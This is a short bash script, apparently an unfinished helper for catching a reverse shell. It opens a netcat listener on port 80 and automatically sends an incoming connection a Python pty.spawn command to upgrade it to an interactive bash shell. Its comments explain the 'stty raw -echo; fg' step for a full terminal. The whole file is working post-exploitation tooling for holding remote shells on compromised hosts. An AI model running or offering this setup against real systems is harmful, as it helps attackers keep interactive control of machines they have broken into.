#!/bin/bash
#!WARNING! - This is WIP and is not fully automated!
# To fully initialise the shell, background the shell (default ctrl+Z) and run `stty raw -echo; fg`
#TODO add stty raw -echo; fg to system
echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'; export TERM=xterm" | nc -lvnp 80 -s 127.0.0.1
